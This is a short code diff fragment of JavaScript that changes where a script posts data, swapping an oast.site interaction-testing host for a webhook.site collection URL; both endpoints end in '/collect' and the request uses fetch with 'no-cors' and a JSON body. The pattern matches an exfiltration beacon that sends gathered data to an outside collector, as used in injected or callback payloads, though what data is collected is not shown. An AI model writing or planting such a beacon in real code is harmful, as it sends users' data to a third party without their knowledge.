@@ -6,7 +6,7 @@
     };
     
     if(typeof fetch !== 'undefined'){
-        fetch('https://mn0vaty9x689m9738gskrx57fzmxdo9ih.oast.site/collect', {
+        fetch('https://webhook.site/d699ea0b-e69e-44af-88bf-03cd8d40bebb/collect', {
             method: 'POST',
             mode: 'no-cors',
             headers: {'Content-Type': 'application/json'},
